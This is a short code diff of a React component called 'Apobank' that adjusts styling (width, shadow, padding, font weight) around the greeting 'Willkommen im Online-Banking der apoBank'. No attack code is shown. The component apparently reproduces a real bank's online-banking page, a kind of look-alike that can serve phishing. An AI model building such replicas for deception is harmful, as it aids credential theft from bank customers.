@@ -64,7 +64,7 @@ const Apobank = () => {
 
       <main
         style={{
-          maxWidth: 940,
+          maxWidth: 820,
           margin: "0 auto",
           padding: "0 12px",
         }}
@@ -73,16 +73,16 @@ const Apobank = () => {
           style={{
             borderRadius: 4,
             overflow: "hidden",
-            boxShadow: "0 .125rem .25rem rgba(0,0,0,.075)",
+            boxShadow: "0 .5rem 1.25rem rgba(0,0,0,.18)",
           }}
         >
           {/* Header */}
-          <div style={{ background: "#fff", padding: "22px 32px" }}>
+          <div style={{ background: "#fff", padding: "22px 48px" }}>
             <h1
               style={{
                 color: PRIMARY,
                 fontSize: 40,
-                fontWeight: 500,
+                fontWeight: 700,
                 margin: 0,
                 lineHeight: 1.2,
               }}
@@ -92,7 +92,7 @@ const Apobank = () => {
           </div>
 
           {/* Body */}
-          <div style={{ background: BODY_BG, padding: "28px 32px 32px" }}>
+          <div style={{ background: BODY_BG, padding: "36px 48px 40px" }}>
             <div style={{ fontWeight: 600, marginBottom: 24 }}>
               Willkommen im Online-Banking der apoBank
             </div>
